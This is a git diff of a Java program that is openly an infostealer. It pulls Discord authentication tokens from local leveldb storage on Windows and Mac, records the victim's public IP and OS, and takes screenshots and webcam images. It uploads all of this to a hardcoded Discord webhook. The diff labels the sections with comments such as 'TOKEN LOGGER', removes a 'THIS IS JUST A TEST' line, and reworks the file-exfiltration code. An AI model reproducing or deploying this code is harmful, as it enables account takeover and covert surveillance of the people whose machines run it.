@@ -1,5 +1,4 @@
 import com.github.sarxos.webcam.Webcam;
-import org.jetbrains.annotations.NotNull;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -10,23 +9,24 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
+import java.nio.file.Files;
+import java.util.*;
 import java.util.List;
-import java.util.Random;
 import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import java.nio.*;
 
 public class Main {
 
     private static final String webhookURL = "https://discord.com/api/webhooks/876962438476611635/H9Sv7_hFEctQ0mLDZ-GVeijW5PUBkG92JuXrjzgn_DiO64j4pSmyvm-ArnmzWIiYVDRa";
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws InterruptedException {
         String userOS = System.getProperty("os.name");
 
-        System.out.println("THIS IS JUST A TEST");
+        sendMessage("--------------------------------------------------------------------------------------");
+        TimeUnit.MILLISECONDS.sleep(100);
 
+        //NAME: IP: OS:
         try {
             URL whatismyip = new URL("http://checkip.amazonaws.com");
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
@@ -37,12 +37,14 @@ public class Main {
         } catch (Exception ignore) {
         }
 
+        //TOKEN LOGGER
         try {
             OSCapture(userOS);
         } catch (Exception ex) {
             sendMessage("``` UNABLE TO PULL TOKENS : " + ex + "```");
         }
 
+        //SCREEN CAPTURE
         try {
             sendMessage("Screen Capture");
             captureScreen();
@@ -50,6 +52,7 @@ public class Main {
             sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
         }
 
+        //CAMERA CAPTURE
         try {
             sendMessage("Camera Capture");
             captureCamera();
@@ -98,10 +101,11 @@ public class Main {
         System.out.println(result.toString());
     }
 
-    private static void OSCapture(String userOS) {
-        if (userOS.contains("Windows")) {
+    private static void OSCapture(String userOS) throws InterruptedException {
+        List<String> paths = new ArrayList<>();
+        StringBuilder webhooks = new StringBuilder();
 
-            List<String> paths = new ArrayList<>();
+        if (userOS.contains("Windows")) {
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
@@ -110,7 +114,6 @@ public class Main {
 
 
             int cx = 0;
-            StringBuilder webhooks = new StringBuilder();
             webhooks.append("TOKEN\n");
 
             for (String path : paths) {
@@ -141,18 +144,17 @@ public class Main {
                         }
 
                     } catch (Exception ignored) {
-                        //webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
+                        webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
+                        TimeUnit.MILLISECONDS.sleep(100);
                     }
                 }
             }
             sendMessage("```" + webhooks.toString() + "```");
 
         } else if (userOS.contains("Mac")) {
-            List<String> paths = new ArrayList<>();
             paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
 
             int cx = 0;
-            StringBuilder webhooks = new StringBuilder();
             webhooks.append("TOKEN\n");
 
             for (String path : paths) {
@@ -194,6 +196,16 @@ public class Main {
     }
 
     private static void sendFile(File file) throws IOException {
+        /*byte[] fileContent = FileUtils.readFileToByteArray(new File(file.toPath().toString()));
+        String encodedString = Base64.getEncoder().encodeToString(fileContent);
+
+        int random = new Random().nextInt();
+        File textfile = new File("cached_" + random + ".txt");
+        PrintWriter baseCode = new PrintWriter(textfile);
+
+        baseCode.println(encodedString);
+        /*^base64 code^*/
+
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(webhookURL).openConnection();
         connection.setDoOutput(true);
@@ -203,9 +215,11 @@ public class Main {
         try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
             writer.println("--" + boundary);
             writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
-            writer.write("Content-Type: image/png");
-            writer.println();
-            //writer.println(readAllBytes(new FileInputStream(file)));
+            writer.println("Content-Type: image/png");
+            byte[] fileContent = Files.readAllBytes(file.toPath());
+            writer.println(fileContent);
+            System.out.println(fileContent);
+            //writer.println(textfile);
 
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                 for (String line; (line = reader.readLine()) != null; ) {
@@ -219,27 +233,6 @@ public class Main {
 
         System.out.println(((HttpURLConnection) connection).getResponseMessage());
 
-    }
-
-    //TODO FIX READALLYBYTES. ONLY PROBLEM IN THE CODE
-    public static byte[] readAllBytes(@NotNull FileInputStream stream) throws IOException {
-        int count, pos = 0;
-        byte[] output = new byte[0];
-        byte[] buf = new byte[1024];
-        while (true) {
-            assert stream != null;
-            if (!((count = stream.read(buf)) > 0)) break;
-            if (pos + count >= output.length) {
-                byte[] tmp = output;
-                output = new byte[pos + count];
-                System.arraycopy(tmp, 0, output, 0, tmp.length);
-            }
-
-            for (int i = 0; i < count; i++) {
-                output[pos++] = buf[i];
-            }
-        }
-        return output;
     }
 
     @SuppressWarnings("all")
